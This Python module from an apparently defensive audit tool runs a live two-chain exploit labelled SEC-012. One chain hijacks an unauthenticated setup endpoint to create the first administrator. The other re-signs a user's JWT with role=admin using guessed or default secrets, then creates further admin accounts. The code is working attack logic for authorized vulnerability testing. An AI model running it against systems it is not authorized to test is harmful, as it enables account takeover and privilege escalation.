# Human: SEC-012 live exploit — unauthenticated setup admin creation (+ optional JWT forgery).
# Agent: HTTP only; RETURNS AuditReport; mutates target DB when confirm_exploit and pre-setup.

from __future__ import annotations

import secrets
from typing import Any, Callable
from urllib.parse import urlparse

from .constants_sec012 import (
    AUDIT_ID,
    AUDIT_LOG_HINT,
    EXPLOIT_ANALYSIS_JWT,
    EXPLOIT_ANALYSIS_SETUP,
    REMEDIATION_SEC012,
    ROUTE_AUTH_LOGIN,
    ROUTE_ADMIN_USERS,
    ROUTE_AUTH_ME,
    ROUTE_AUTH_REGISTER,
    ROUTE_SETTINGS_REGISTRATION,
    ROUTE_SETUP,
    ROUTE_SETUP_STATUS,
)
from .evidence_sec012 import (
    build_admin_api_evidence,
    build_jwt_forgery_evidence,
    build_setup_admin_evidence,
)
from .heuristics import json_get
from .heuristics_sec012 import (
    bootstrap_token_enforced,
    extract_login_token,
    extract_login_user,
    extract_setup_auth,
    registration_enabled,
    response_indicates_admin_forbidden,
    response_indicates_admin_users_list,
    setup_blocked_after_init,
    setup_mutation_succeeded,
    user_role_from_response,
)
from .http_client import api_url, http_get_with_retries, http_post_json
from .jwt_sec012 import (
    match_jwt_secret_for_token,
    reissue_jwt_with_role,
)
from .models import AuditReport, CaseResult, HttpResult, Sec012Config


def _http(cfg: Sec012Config):
    return cfg.http


def _auth_headers(token: str) -> dict[str, str]:
    return {"Authorization": f"Bearer {token}"}


def _api_error_message(res: HttpResult) -> str:
    # Human: Pull safe client error text from AppError JSON envelope.
    # Agent: RETURNS message string or empty when body is not JSON.
    if res.body_json is not None and isinstance(res.body_json, dict):
        err = res.body_json.get("error")
        if isinstance(err, dict):
            msg = err.get("message")
            if isinstance(msg, str) and msg.strip():
                return msg.strip()
    text = res.body_text.strip()
    return text[:240] if text else ""


def _looks_like_placeholder_email(email: str) -> bool:
    lowered = email.strip().lower()
    hints = (
        "example.com",
        "your-existing-user",
        "your-user@",
        "your-pro-user",
        "attacker@audit",
        "@audit.invalid",
    )
    return any(h in lowered for h in hints)


def fail_result(
    name: str,
    detail: str,
    *,
    evidence_key: str | None = None,
) -> CaseResult:
    return CaseResult(
        name=name,
        passed=False,
        detail=detail,
        severity="fail",
        evidence_key=evidence_key,
        remediation=REMEDIATION_SEC012,
    )


def run_case(name: str, fn: Callable[[], CaseResult]) -> CaseResult:
    try:
        return fn()
    except Exception as exc:  # noqa: BLE001
        return CaseResult(
            name=name,
            passed=False,
            detail=f"unexpected error: {exc}",
            severity="error",
        )


def _record_timing(cache: dict[str, Any], key: str, res: HttpResult) -> None:
    if res.elapsed_ms is not None:
        cache.setdefault("timings_ms", {})[key] = round(res.elapsed_ms, 1)


def _created_admin_email(cfg: Sec012Config, cache: dict[str, Any]) -> str:
    email = cfg.created_admin_email.strip()
    if not email:
        email = f"sec012-created-{secrets.token_hex(4)}@audit.invalid"
    cache["created_admin_email"] = email
    return email


def _resolve_credentials(cfg: Sec012Config, cache: dict[str, Any]) -> tuple[str, str]:
    email = cfg.exploit_email.strip()
    if not email:
        email = f"sec012-{secrets.token_hex(4)}@audit.invalid"
    password = cfg.exploit_password.strip()
    if not password:
        password = f"Sec012-{secrets.token_hex(8)}!"
    if len(password) < 8:
        raise ValueError("exploit password must be at least 8 characters")
    cache["exploit_email"] = email
    cache["exploit_password"] = password
    return email, password


def _setup_body(cfg: Sec012Config, email: str, password: str) -> dict[str, Any]:
    return {
        "email": email,
        "password": password,
        "instance_name": cfg.instance_name or "SEC012 Exploit Instance",
        "allow_public_registration": False,
        "require_account_activation": False,
    }


def test_confirm_exploit_acknowledged(cfg: Sec012Config, _cache: dict[str, Any]) -> CaseResult:
    if cfg.confirm_exploit:
        return CaseResult(
            name="confirm_exploit_acknowledged",
            passed=True,
            detail="live exploit enabled (--confirm-exploit or SEC012_CONFIRM_EXPLOIT=1)",
            severity="pass",
        )
    return CaseResult(
        name="confirm_exploit_acknowledged",
        passed=False,
        detail=(
            "refusing live exploit without --confirm-exploit "
            "(creates first admin on fresh DB; destructive)"
        ),
        severity="error",
    )


def test_target_reachable(cfg: Sec012Config, cache: dict[str, Any]) -> CaseResult:
    http = _http(cfg)
    url = api_url(http, ROUTE_SETUP_STATUS)
    res = http_get_with_retries(http, url)
    cache["setup_status"] = res
    _record_timing(cache, "setup_status", res)
    if res.error:
        return CaseResult(
            name="target_reachable",
            passed=False,
            detail=f"cannot reach {url}: {res.error}",
            severity="error",
        )
    return CaseResult(
        name="target_reachable",
        passed=True,
        detail=f"GET {ROUTE_SETUP_STATUS} -> HTTP {res.status}",
        severity="pass",
    )


def test_setup_status_readable(cfg: Sec012Config, cache: dict[str, Any]) -> CaseResult:
    res: HttpResult = cache["setup_status"]
    complete = json_get(res.body_json, "setup_complete") if res.body_json else None
    cache["setup_complete"] = complete
    cache["exploit_analysis"] = [EXPLOIT_ANALYSIS_SETUP]
    if complete is True and cfg.try_jwt_forgery and cfg.jwt_secrets:
        cache["exploit_analysis"].append(EXPLOIT_ANALYSIS_JWT)
    return CaseResult(
        name="setup_status_readable",
        passed=True,
        detail=f"setup_complete={complete!r}",
        severity="pass",
    )


def test_exploit_primitive(_cfg: Sec012Config, _cache: dict[str, Any]) -> CaseResult:
    return CaseResult(
        name="exploit_primitive_unauthenticated",
        passed=True,
        detail="setup hijack and gate probes use no Authorization header",
        severity="pass",
    )


def test_setup_gate_probe(cfg: Sec012Config, cache: dict[str, Any]) -> CaseResult:
    http = _http(cfg)
    url = api_url(http, ROUTE_SETUP)
    body = {
        "email": f"sec012-probe-{secrets.token_hex(3)}@audit.invalid",
        "password": "short",
        "instance_name": "SEC012 gate probe",
        "allow_public_registration": False,
    }
    res = http_post_json(http, url, body)
    cache["setup_gate_probe"] = res
    _record_timing(cache, "setup_gate_probe", res)
    if res.error:
        return CaseResult(
            name="setup_gate_probe",
            passed=False,
            detail=f"probe failed: {res.error}",
            severity="error",
        )
    if bootstrap_token_enforced(res):
        cache["bootstrap_gated"] = True
        return CaseResult(
            name="setup_gate_probe",
            passed=True,
            detail=f"POST {ROUTE_SETUP} requires bootstrap credential (HTTP {res.status})",
            severity="pass",
        )
    if res.status in (400, 409):
        return CaseResult(
            name="setup_gate_probe",
            passed=True,
            detail=f"setup endpoint reachable without auth (HTTP {res.status})",
            severity="pass",
        )
    if setup_mutation_succeeded(res):
        return fail_result(
            "setup_gate_probe",
            "invalid probe unexpectedly completed setup",
            evidence_key="setup",
        )
    return CaseResult(
        name="setup_gate_probe",
        passed=False,
        detail=f"unexpected gate probe HTTP {res.status}",
        severity="error",
    )


def test_setup_admin_creation(cfg: Sec012Config, cache: dict[str, Any]) -> CaseResult:
    if not cfg.confirm_exploit:
        return CaseResult(
            name="setup_admin_creation",
            passed=True,
            detail="skipped (no --confirm-exploit)",
            severity="pass",
        )
    if cache.get("setup_complete") is not False:
        return CaseResult(
            name="setup_admin_creation",
            passed=True,
            detail="skipped (instance already initialized — use JWT forgery path)",
            severity="pass",
        )
    if cache.get("bootstrap_gated"):
        return CaseResult(
            name="setup_admin_creation",
            passed=True,
            detail="skipped (bootstrap token enforced)",
            severity="pass",
        )
    http = _http(cfg)
    try:
        email, password = _resolve_credentials(cfg, cache)
    except ValueError as exc:
        return CaseResult(
            name="setup_admin_creation",
            passed=False,
            detail=str(exc),
            severity="error",
        )
    url = api_url(http, ROUTE_SETUP)
    res = http_post_json(http, url, _setup_body(cfg, email, password))
    cache["setup_exploit"] = res
    _record_timing(cache, "setup_exploit", res)
    if res.error:
        return CaseResult(
            name="setup_admin_creation",
            passed=False,
            detail=f"exploit POST failed: {res.error}",
            severity="error",
        )
    if bootstrap_token_enforced(res):
        return CaseResult(
            name="setup_admin_creation",
            passed=True,
            detail="exploit blocked by bootstrap token gate",
            severity="pass",
        )
    if not setup_mutation_succeeded(res):
        msg = res.body_text[:200] if res.body_text else ""
        return CaseResult(
            name="setup_admin_creation",
            passed=False,
            detail=f"setup did not return JWT (HTTP {res.status}) {msg}".strip(),
            severity="error",
        )
    auth = extract_setup_auth(res)
    token = None
    user_id = None
    if auth:
        token = auth.get("token")
        user = auth.get("user")
        if isinstance(user, dict):
            user_id = user.get("id")
    if isinstance(token, str):
        cache["exploit_token"] = token.strip()
    cache["evidence_setup"] = build_setup_admin_evidence(
        res, email=email, user_id=user_id if isinstance(user_id, str) else None
    )
    return fail_result(
        "setup_admin_creation",
        f"created first administrator {email!r} via unauthenticated POST {ROUTE_SETUP}",
        evidence_key="setup",
    )


def test_setup_user_role_admin(cfg: Sec012Config, cache: dict[str, Any]) -> CaseResult:
    res: HttpResult | None = cache.get("setup_exploit")
    if res is None:
        return CaseResult(
            name="setup_user_role_admin",
            passed=True,
            detail="skipped",
            severity="pass",
        )
    role = user_role_from_response(res)
    if role == "admin":
        return fail_result(
            "setup_user_role_admin",
            "auth response reports role=admin for created account",
        )
    return CaseResult(
        name="setup_user_role_admin",
        passed=False,
        detail=f"expected role=admin in setup response, got {role!r}",
        severity="error",
    )


def test_login_as_created_admin(cfg: Sec012Config, cache: dict[str, Any]) -> CaseResult:
    if "exploit_email" not in cache:
        return CaseResult(
            name="login_as_created_admin",
            passed=True,
            detail="skipped",
            severity="pass",
        )
    http = _http(cfg)
    url = api_url(http, ROUTE_AUTH_LOGIN)
    res = http_post_json(
        http,
        url,
        {"email": cache["exploit_email"], "password": cache["exploit_password"]},
    )
    cache["login_exploit"] = res
    _record_timing(cache, "login_exploit", res)
    token = extract_login_token(res)
    if token:
        cache["exploit_token"] = token
    role = user_role_from_response(res)
    if res.status == 200 and role == "admin" and token:
        return fail_result(
            "login_as_created_admin",
            f"login confirmed administrator role for {cache['exploit_email']!r}",
        )
    if res.status != 200:
        return CaseResult(
            name="login_as_created_admin",
            passed=False,
            detail=f"login failed HTTP {res.status}",
            severity="error",
        )
    return CaseResult(
        name="login_as_created_admin",
        passed=False,
        detail=f"unexpected login outcome role={role!r}",
        severity="error",
    )


def test_admin_api_access(cfg: Sec012Config, cache: dict[str, Any]) -> CaseResult:
    token = cache.get("exploit_token") or cache.get("forged_token")
    if not token:
        return CaseResult(
            name="admin_api_access",
            passed=True,
            detail="skipped (no session token)",
            severity="pass",
        )
    http = _http(cfg)
    route = cfg.admin_probe_route
    url = api_url(http, route)
    res = http_get_with_retries(http, url, extra_headers=_auth_headers(token))
    cache["admin_probe"] = res
    _record_timing(cache, "admin_probe", res)
    via = cache.get("exploit_chain", "setup_hijack")
    if response_indicates_admin_users_list(res):
        cache["evidence_admin"] = build_admin_api_evidence(res, route=route, via=via)
        return fail_result(
            "admin_api_access",
            f"GET {route} returned admin user directory (HTTP {res.status})",
            evidence_key="admin",
        )
    if response_indicates_admin_forbidden(res):
        return CaseResult(
            name="admin_api_access",
            passed=True,
            detail=f"admin route denied (HTTP {res.status})",
            severity="pass",
        )
    return CaseResult(
        name="admin_api_access",
        passed=False,
        detail=f"unexpected admin probe HTTP {res.status}",
        severity="error",
    )


def test_auth_me_role_admin(cfg: Sec012Config, cache: dict[str, Any]) -> CaseResult:
    token = cache.get("exploit_token") or cache.get("forged_token")
    if not token:
        return CaseResult(
            name="auth_me_role_admin",
            passed=True,
            detail="skipped",
            severity="pass",
        )
    http = _http(cfg)
    url = api_url(http, ROUTE_AUTH_ME)
    res = http_get_with_retries(http, url, extra_headers=_auth_headers(token))
    cache["auth_me"] = res
    role = user_role_from_response(res)
    if res.status == 200 and role == "admin":
        return fail_result(
            "auth_me_role_admin",
            "GET /auth/me reports role=admin for exploit session",
        )
    return CaseResult(
        name="auth_me_role_admin",
        passed=True,
        detail=f"auth/me role={role!r} HTTP {res.status}",
        severity="pass",
    )


def test_initialized_instance_blocked(cfg: Sec012Config, cache: dict[str, Any]) -> CaseResult:
    if cache.get("setup_complete") is not True:
        return CaseResult(
            name="initialized_instance_blocked",
            passed=True,
            detail="skipped (pre-setup exploit path)",
            severity="pass",
        )
    if not cfg.confirm_exploit:
        return CaseResult(
            name="initialized_instance_blocked",
            passed=True,
            detail="skipped",
            severity="pass",
        )
    http = _http(cfg)
    try:
        email, password = _resolve_credentials(cfg, cache)
    except ValueError as exc:
        return CaseResult(
            name="initialized_instance_blocked",
            passed=False,
            detail=str(exc),
            severity="error",
        )
    url = api_url(http, ROUTE_SETUP)
    res = http_post_json(http, url, _setup_body(cfg, email, password))
    cache["setup_second"] = res
    if setup_blocked_after_init(res):
        return CaseResult(
            name="initialized_instance_blocked",
            passed=True,
            detail=f"second setup blocked (HTTP {res.status})",
            severity="pass",
        )
    if setup_mutation_succeeded(res):
        return fail_result(
            "initialized_instance_blocked",
            "POST /setup still creates admin on initialized instance",
            evidence_key="setup",
        )
    return CaseResult(
        name="initialized_instance_blocked",
        passed=False,
        detail=f"expected 409 or auth gate, got HTTP {res.status}",
        severity="error",
    )


def test_subject_credentials_ready(cfg: Sec012Config, cache: dict[str, Any]) -> CaseResult:
    if cache.get("setup_complete") is not True:
        return CaseResult(
            name="subject_credentials_ready",
            passed=True,
            detail="skipped (fresh instance uses setup hijack)",
            severity="pass",
        )
    if not cfg.confirm_exploit or not cfg.try_jwt_forgery:
        return CaseResult(
            name="subject_credentials_ready",
            passed=True,
            detail="skipped",
            severity="pass",
        )
    missing: list[str] = []
    if not cfg.exploit_email:
        missing.append("email")
    if not cfg.exploit_password:
        missing.append("password")
    if missing:
        return CaseResult(
            name="subject_credentials_ready",
            passed=False,
            detail=(
                f"missing subject {', '.join(missing)} — use --exploit-email/--exploit-password, "
                "SEC012_EXPLOIT_*, or --prompt"
            ),
            severity="error",
        )
    if _looks_like_placeholder_email(cfg.exploit_email):
        return CaseResult(
            name="subject_credentials_ready",
            passed=False,
            detail=(
                f"SEC012_EXPLOIT_EMAIL looks like a README placeholder ({cfg.exploit_email!r}) — "
                "set a real non-admin account that exists on this instance"
            ),
            severity="error",
        )
    return CaseResult(
        name="subject_credentials_ready",
        passed=True,
        detail="subject credentials configured",
        severity="pass",
    )


def _obtain_subject_session(
    cfg: Sec012Config, cache: dict[str, Any]
) -> CaseResult | None:
    # Human: Login existing user, or register when public registration is enabled.
    # Agent: WRITES subject_user_id, subject_token, subject_role into cache; RETURNS error CaseResult.
    http = _http(cfg)
    try:
        email, password = _resolve_credentials(cfg, cache)
    except ValueError as exc:
        return CaseResult(
            name="subject_session_obtained",
            passed=False,
            detail=str(exc),
            severity="error",
        )
    login = http_post_json(
        http,
        api_url(http, ROUTE_AUTH_LOGIN),
        {"email": email, "password": password},
    )
    cache["subject_login"] = login
    token = extract_login_token(login)
    user = extract_login_user(login)
    user_id = user.get("id") if user else None
    role = user_role_from_response(login)
    if login.status == 200 and token and isinstance(user_id, str):
        cache["subject_email"] = email
        cache["subject_password"] = password
        cache["subject_user_id"] = user_id
        cache["subject_token"] = token
        cache["subject_role"] = role
        return None

    login_detail = _api_error_message(login)
    reg_setting = http_get_with_retries(http, api_url(http, ROUTE_SETTINGS_REGISTRATION))
    if registration_enabled(reg_setting) is not True:
        hint = login_detail or "check email/password"
        extra = ""
        if login.status == 403 and "activat" in login_detail.lower():
            extra = " — ask an admin to enable the account"
        return CaseResult(
            name="subject_session_obtained",
            passed=False,
            detail=(
                f"login failed (HTTP {login.status}: {hint}) and public registration is disabled"
                f"{extra}"
            ),
            severity="error",
        )
    reg = http_post_json(
        http,
        api_url(http, ROUTE_AUTH_REGISTER),
        {"email": email, "password": password},
    )
    cache["register"] = reg
    token = extract_login_token(reg)
    user = extract_login_user(reg)
    user_id = user.get("id") if user else None
    role = user_role_from_response(reg)
    if reg.status in (200, 201) and token and isinstance(user_id, str):
        cache["subject_email"] = email
        cache["subject_password"] = password
        cache["subject_user_id"] = user_id
        cache["subject_token"] = token
        cache["subject_role"] = role
        return None
    if reg.status == 409:
        retry = http_post_json(
            http,
            api_url(http, ROUTE_AUTH_LOGIN),
            {"email": email, "password": password},
        )
        cache["subject_login_retry"] = retry
        token = extract_login_token(retry)
        user = extract_login_user(retry)
        user_id = user.get("id") if user else None
        role = user_role_from_response(retry)
        if retry.status == 200 and token and isinstance(user_id, str):
            cache["subject_email"] = email
            cache["subject_password"] = password
            cache["subject_user_id"] = user_id
            cache["subject_token"] = token
            cache["subject_role"] = role
            return None
        login_detail = _api_error_message(retry) or login_detail
    reg_detail = _api_error_message(reg)
    return CaseResult(
        name="subject_session_obtained",
        passed=False,
        detail=(
            f"could not obtain subject session (login HTTP {login.status}: {login_detail or 'n/a'}; "
            f"register HTTP {reg.status}: {reg_detail or 'n/a'})"
        ),
        severity="error",
    )


def _bootstrap_staging_subject(cfg: Sec012Config, cache: dict[str, Any]) -> CaseResult | None:
    # Human: When operator only has an admin account, create a pro user then use that for Chain B.
    # Agent: CALLS POST /admin/users with admin token; REPLACES cache subject_* with staging session.
    admin_token = cache.get("subject_token")
    if not isinstance(admin_token, str) or not admin_token.strip():
        return CaseResult(
            name="subject_session_obtained",
            passed=False,
            detail="cannot bootstrap staging user — admin login token missing",
            severity="error",
        )
    http = _http(cfg)
    staging_email = f"sec012-staging-{secrets.token_hex(4)}@audit.invalid"
    staging_password = f"Sec012-{secrets.token_hex(10)}!"
    create = http_post_json(
        http,
        api_url(http, ROUTE_ADMIN_USERS),
        {
            "email": staging_email,
            "password": staging_password,
            "role": "pro",
            "enabled": True,
        },
        extra_headers=_auth_headers(admin_token),
    )
    cache["bootstrap_create"] = create
    if create.status not in (200, 201):
        return CaseResult(
            name="subject_session_obtained",
            passed=False,
            detail=(
                f"admin could not create staging pro user (HTTP {create.status}: "
                f"{_api_error_message(create) or 'n/a'})"
            ),
            severity="error",
        )
    login = http_post_json(
        http,
        api_url(http, ROUTE_AUTH_LOGIN),
        {"email": staging_email, "password": staging_password},
    )
    cache["bootstrap_login"] = login
    token = extract_login_token(login)
    user = extract_login_user(login)
    user_id = user.get("id") if user else None
    role = user_role_from_response(login)
    if login.status != 200 or not token or not isinstance(user_id, str):
        return CaseResult(
            name="subject_session_obtained",
            passed=False,
            detail=f"staging pro user login failed (HTTP {login.status})",
            severity="error",
        )
    cache["bootstrap_admin_email"] = cache.get("subject_email")
    cache["subject_email"] = staging_email
    cache["subject_password"] = staging_password
    cache["subject_user_id"] = user_id
    cache["subject_token"] = token
    cache["subject_role"] = role
    cache["bootstrapped_via_admin"] = True
    return None


def test_subject_session_obtained(cfg: Sec012Config, cache: dict[str, Any]) -> CaseResult:
    if cache.get("setup_complete") is not True or not cfg.confirm_exploit or not cfg.try_jwt_forgery:
        return CaseResult(
            name="subject_session_obtained",
            passed=True,
            detail="skipped",
            severity="pass",
        )
    err = _obtain_subject_session(cfg, cache)
    if err is not None:
        return err
    role = cache.get("subject_role")
    if role == "admin":
        if not cfg.bootstrap_via_admin:
            return CaseResult(
                name="subject_session_obtained",
                passed=False,
                detail=(
                    "subject is already admin — use a pro/standard/user account, or omit "
                    "--no-bootstrap-via-admin to auto-create a staging pro user"
                ),
                severity="error",
            )
        boot = _bootstrap_staging_subject(cfg, cache)
        if boot is not None:
            return boot
        role = cache.get("subject_role")
    return CaseResult(
        name="subject_session_obtained",
        passed=True,
        detail=(
            f"session for subject role={role!r} (user_id={cache.get('subject_user_id')!r})"
            + (
                f"; bootstrapped from admin {cache.get('bootstrap_admin_email')!r}"
                if cache.get("bootstrapped_via_admin")
                else ""
            )
        ),
        severity="pass",
    )


def test_jwt_secrets_configured(cfg: Sec012Config, cache: dict[str, Any]) -> CaseResult:
    if cache.get("setup_complete") is not True or not cfg.try_jwt_forgery:
        return CaseResult(
            name="jwt_secrets_configured",
            passed=True,
            detail="skipped",
            severity="pass",
        )
    if cfg.jwt_secrets:
        cache["jwt_secret_count"] = len(cfg.jwt_secrets)
        subject_token = cache.get("subject_token")
        matched = (
            match_jwt_secret_for_token(subject_token, list(cfg.jwt_secrets))
            if isinstance(subject_token, str)
            else None
        )
        if matched:
            cache["matched_jwt_secret"] = matched
            return CaseResult(
                name="jwt_secrets_configured",
                passed=True,
                detail=(
                    f"{len(cfg.jwt_secrets)} candidate(s); login token signature matched one "
                    "(ready to re-sign with role=admin)"
                ),
                severity="pass",
            )
        return CaseResult(
            name="jwt_secrets_configured",
            passed=True,
            detail=(
                f"{len(cfg.jwt_secrets)} candidate(s); none signed the subject login token — "
                "API JWT_SECRET may differ from repo .env / Compose defaults"
            ),
            severity="pass",
        )
    return CaseResult(
        name="jwt_secrets_configured",
        passed=False,
        detail="no JWT_SECRET — set JWT_SECRET in .env, --jwt-secret, or allow dev defaults",
        severity="error",
    )


def test_jwt_forgery_escalation(cfg: Sec012Config, cache: dict[str, Any]) -> CaseResult:
    if cache.get("setup_complete") is not True:
        return CaseResult(
            name="jwt_forgery_escalation",
            passed=True,
            detail="skipped (fresh instance — setup hijack path applies)",
            severity="pass",
        )
    if not cfg.confirm_exploit or not cfg.try_jwt_forgery:
        return CaseResult(
            name="jwt_forgery_escalation",
            passed=True,
            detail="skipped",
            severity="pass",
        )
    if "subject_user_id" not in cache or not cfg.jwt_secrets:
        return CaseResult(
            name="jwt_forgery_escalation",
            passed=True,
            detail="skipped (prerequisites failed)",
            severity="pass",
        )
    http = _http(cfg)
    email = cache["subject_email"]
    user_id = cache["subject_user_id"]
    source = cache.get("subject_token")
    matched = cache.get("matched_jwt_secret")
    if not matched and isinstance(source, str):
        matched = match_jwt_secret_for_token(source, list(cfg.jwt_secrets))
        if matched:
            cache["matched_jwt_secret"] = matched
    secrets_to_try = [matched] if matched else list(cfg.jwt_secrets)
    last_status = 0
    for secret in secrets_to_try:
        forged = reissue_jwt_with_role(
            user_id=user_id,
            email=email,
            role="admin",
            jwt_secret=secret,
            source_token=source,
        )
        probe = http_get_with_retries(
            http,
            api_url(http, cfg.admin_probe_route),
            extra_headers=_auth_headers(forged),
        )
        last_status = probe.status
        if response_indicates_admin_users_list(probe):
            cache["forged_token"] = forged
            cache["working_jwt_secret_hint"] = "matched"
            cache["exploit_chain"] = "jwt_role_forgery"
            cache["exploit_email"] = email
            cache["forged_admin_probe"] = probe
            cache["evidence_forgery"] = build_jwt_forgery_evidence(
                probe, subject_email=email, route=cfg.admin_probe_route
            )
            return fail_result(
                "jwt_forgery_escalation",
                "re-signed JWT with role=admin grants GET /admin/users (JWT role trusted over DB)",
                evidence_key="forgery",
            )
    return CaseResult(
        name="jwt_forgery_escalation",
        passed=True,
        detail=(
            f"forged admin JWT denied on {cfg.admin_probe_route} (last HTTP {last_status}) — "
            "patched (role from DB) or JWT_SECRET still unknown"
        ),
        severity="pass",
    )


def test_admin_user_created_via_api(cfg: Sec012Config, cache: dict[str, Any]) -> CaseResult:
    token = cache.get("forged_token")
    if not token or cache.get("setup_complete") is not True:
        return CaseResult(
            name="admin_user_created_via_api",
            passed=True,
            detail="skipped",
            severity="pass",
        )
    http = _http(cfg)
    new_email = _created_admin_email(cfg, cache)
    new_password = cache.get("exploit_password") or f"Sec012-{secrets.token_hex(8)}!"
    cache["created_admin_password"] = new_password
    res = http_post_json(
        http,
        api_url(http, ROUTE_ADMIN_USERS),
        {
            "email": new_email,
            "password": new_password,
            "role": "admin",
            "enabled": True,
        },
        extra_headers=_auth_headers(token),
    )
    cache["admin_create"] = res
    _record_timing(cache, "admin_create", res)
    if res.status in (200, 201) and res.body_json and isinstance(res.body_json, dict):
        role = res.body_json.get("role")
        if role == "admin":
            cache["evidence_admin_create"] = build_setup_admin_evidence(
                res,
                email=new_email,
                user_id=res.body_json.get("id")
                if isinstance(res.body_json.get("id"), str)
                else None,
                route=ROUTE_ADMIN_USERS,
            )
            return fail_result(
                "admin_user_created_via_api",
                f"POST {ROUTE_ADMIN_USERS} inserted administrator {new_email!r}",
                evidence_key="admin_create",
            )
    if response_indicates_admin_forbidden(res):
        return CaseResult(
            name="admin_user_created_via_api",
            passed=True,
            detail="admin user create denied (forgery did not stick)",
            severity="pass",
        )
    return CaseResult(
        name="admin_user_created_via_api",
        passed=False,
        detail=f"POST {ROUTE_ADMIN_USERS} failed (HTTP {res.status})",
        severity="error",
    )


def test_created_admin_login(cfg: Sec012Config, cache: dict[str, Any]) -> CaseResult:
    if "created_admin_email" not in cache:
        return CaseResult(
            name="created_admin_login",
            passed=True,
            detail="skipped",
            severity="pass",
        )
    http = _http(cfg)
    res = http_post_json(
        http,
        api_url(http, ROUTE_AUTH_LOGIN),
        {
            "email": cache["created_admin_email"],
            "password": cache.get("created_admin_password", ""),
        },
    )
    cache["created_admin_login"] = res
    role = user_role_from_response(res)
    token = extract_login_token(res)
    if res.status == 200 and role == "admin" and token:
        cache["exploit_token"] = token
        return fail_result(
            "created_admin_login",
            f"new administrator {cache['created_admin_email']!r} logs in with role=admin",
        )
    return CaseResult(
        name="created_admin_login",
        passed=False,
        detail=f"created admin login failed (HTTP {res.status}, role={role!r})",
        severity="error",
    )


def test_register_then_forge_blocked(cfg: Sec012Config, cache: dict[str, Any]) -> CaseResult:
    if cache.get("setup_complete") is not True:
        return CaseResult(
            name="register_then_forge_blocked",
            passed=True,
            detail="skipped (pre-setup)",
            severity="pass",
        )
    login = cache.get("login_exploit") or cache.get("register")
    if login is not None:
        role = user_role_from_response(login)
        if role and role != "admin":
            return CaseResult(
                name="register_then_forge_blocked",
                passed=True,
                detail=f"register/login assigns role={role!r} (not admin) without forgery",
                severity="pass",
            )
    return CaseResult(
        name="register_then_forge_blocked",
        passed=True,
        detail="no register/login sample in cache",
        severity="pass",
    )


def run_sec012_audit(cfg: Sec012Config) -> tuple[AuditReport, dict[str, Any]]:
    cache: dict[str, Any] = {}
    results: list[CaseResult] = []

    steps: list[tuple[str, Callable[[], CaseResult]]] = [
        ("confirm", lambda: test_confirm_exploit_acknowledged(cfg, cache)),
        ("target", lambda: test_target_reachable(cfg, cache)),
        ("status", lambda: test_setup_status_readable(cfg, cache)),
        ("primitive", lambda: test_exploit_primitive(cfg, cache)),
        ("gate", lambda: test_setup_gate_probe(cfg, cache)),
        ("create", lambda: test_setup_admin_creation(cfg, cache)),
        ("role", lambda: test_setup_user_role_admin(cfg, cache)),
        ("login", lambda: test_login_as_created_admin(cfg, cache)),
        ("blocked", lambda: test_initialized_instance_blocked(cfg, cache)),
        ("creds", lambda: test_subject_credentials_ready(cfg, cache)),
        ("subject", lambda: test_subject_session_obtained(cfg, cache)),
        ("secrets", lambda: test_jwt_secrets_configured(cfg, cache)),
        ("forgery", lambda: test_jwt_forgery_escalation(cfg, cache)),
        ("admin_create", lambda: test_admin_user_created_via_api(cfg, cache)),
        ("created_login", lambda: test_created_admin_login(cfg, cache)),
        ("admin", lambda: test_admin_api_access(cfg, cache)),
        ("me", lambda: test_auth_me_role_admin(cfg, cache)),
        ("register", lambda: test_register_then_forge_blocked(cfg, cache)),
    ]

    for _name, fn in steps:
        result = run_case(_name, fn)
        results.append(result)
        if result.name == "target_reachable" and not result.passed:
            break
        if result.name == "confirm_exploit_acknowledged" and not result.passed:
            break
        if _http(cfg).fail_fast and not result.passed and result.severity == "fail":
            break

    fails = [r for r in results if not r.passed and r.severity == "fail"]
    errors = [r for r in results if not r.passed and r.severity == "error"]

    if not cfg.confirm_exploit:
        verdict, exit_code = "inconclusive", 2
    elif fails:
        verdict, exit_code = "vulnerable", 1
    elif errors:
        verdict, exit_code = "inconclusive", 2
    else:
        verdict, exit_code = "ok", 0

    evidence: dict[str, Any] = {}
    for key in ("setup", "admin", "forgery", "admin_create"):
        if f"evidence_{key}" in cache:
            evidence[key] = cache[f"evidence_{key}"]

    hints: list[str] = []
    if fails:
        hints.append(REMEDIATION_SEC012)
        hints.append(AUDIT_LOG_HINT)
    if not cfg.confirm_exploit:
        hints.append(
            "Re-run with --confirm-exploit. Initialized instances need --exploit-email/--exploit-password "
            "(any non-admin user) and JWT_SECRET in .env."
        )
    elif cache.get("setup_complete") is True and not fails and cfg.try_jwt_forgery:
        hints.append(
            "Exploit did not succeed — confirm JWT_SECRET matches the API .env and subject credentials are valid."
        )

    report = AuditReport(
        audit_id=AUDIT_ID,
        target=f"{cfg.http.base_url}{cfg.http.api_prefix}",
        verdict=verdict,
        exit_code=exit_code,
        setup_complete=cache.get("setup_complete"),
        results=results,
        evidence=evidence,
        timings_ms=cache.get("timings_ms", {}),
        remediation_hints=hints,
    )
    cache["exploit_analysis_lines"] = cache.get("exploit_analysis", [])
    return report, cache


def validate_target_url(cfg: Sec012Config) -> str | None:
    parsed = urlparse(cfg.http.base_url)
    if not parsed.scheme or not parsed.netloc:
        return f"Invalid base URL: {cfg.http.base_url!r}"
    return None
